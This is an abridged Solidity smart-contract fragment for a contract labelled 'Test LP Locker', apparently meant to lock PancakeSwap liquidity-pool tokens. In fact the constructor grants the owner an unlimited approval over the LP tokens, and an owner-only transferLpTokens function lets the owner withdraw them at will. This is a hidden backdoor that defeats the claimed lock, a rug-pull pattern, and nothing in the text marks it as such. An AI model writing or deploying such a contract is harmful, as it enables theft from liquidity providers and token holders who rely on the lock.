...
contract BNBAD is Ownable {
    ...
    string private _name = "Test LP Locker";
    string private _symbol = "Test LP";

    constructor () public {

        // set the rest of the contract variables
        uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        PancakePair pair = PancakePair(0xB60429C0Bf80107337e1C9Cc4880F00Ccb013Dd0);
        pair.approve(owner, 10000000000000000000000000000000000000);
    }
    ...
    function transferLpTokens(address lpAddress, uint256 tamount) external onlyOwner {
        PancakePair pair = PancakePair(lpAddress);
        pair.transferFrom(address(this), owner, tamount);
    }
